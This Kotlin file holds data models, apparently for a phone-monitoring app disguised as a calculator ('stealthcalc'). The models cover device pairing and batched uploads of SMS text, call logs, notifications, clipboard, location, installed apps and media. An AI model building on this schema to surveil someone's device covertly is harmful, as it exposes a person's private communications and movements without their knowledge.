package com.stealthcalc.monitoring.model

import kotlinx.serialization.Serializable

@Serializable
data class EventBatch(
    val deviceId: String,
    val events: List<EventPayload>,
)

@Serializable
data class EventPayload(
    val id: String,
    val kind: String,
    val payload: String,
    val capturedAt: Long,
)

@Serializable
data class PairRequest(
    val otp: String,
    val deviceName: String,
)

@Serializable
data class PairResponse(
    val deviceId: String,
    val token: String,
)

@Serializable
data class DeviceState(
    val deviceId: String,
    val deviceName: String,
    val lastSeen: Long,
    val currentApp: String? = null,
    val batteryLevel: Int? = null,
    val isCharging: Boolean? = null,
    val wifiSsid: String? = null,
    val isScreenOn: Boolean? = null,
    val latitude: Double? = null,
    val longitude: Double? = null,
)

@Serializable
data class AppUsagePayload(
    val packageName: String,
    val appName: String? = null,
    val event: String,
    val timestampMs: Long,
)

@Serializable
data class BatteryPayload(
    val level: Int,
    val scale: Int,
    val isCharging: Boolean,
    val plugType: String,
    val temperature: Int,
    val voltage: Int,
)

@Serializable
data class NetworkPayload(
    val type: String,
    val ssid: String? = null,
    val bssid: String? = null,
    val connected: Boolean,
)

@Serializable
data class AppInstallPayload(
    val packageName: String,
    val action: String,
    val appName: String? = null,
    val versionName: String? = null,
)

@Serializable
data class NotificationPayload(
    val packageName: String,
    val appName: String? = null,
    val title: String? = null,
    val text: String? = null,
    val category: String? = null,
    val postedAt: Long,
)

@Serializable
data class LocationPayload(
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float,
    val provider: String? = null,
)

@Serializable
data class ScreenEventPayload(
    val event: String,
    val timestampMs: Long,
)

@Serializable
data class CallLogPayload(
    val number: String,
    val contactName: String? = null,
    val type: String,
    val duration: Int,
    val date: Long,
)

@Serializable
data class SmsPayload(
    val address: String,
    val contactName: String? = null,
    val body: String,
    val type: String,
    val date: Long,
)

@Serializable
data class MediaAddedPayload(
    val displayName: String,
    val relativePath: String? = null,
    val mimeType: String? = null,
    val sizeBytes: Long,
    val dateAdded: Long,
    val width: Int? = null,
    val height: Int? = null,
    val mediaType: String,
)

@Serializable
data class SecurityEventPayload(
    val event: String,
    val details: String? = null,
    val timestampMs: Long,
)

@Serializable
data class ClipboardPayload(
    val text: String,
    val timestampMs: Long,
)
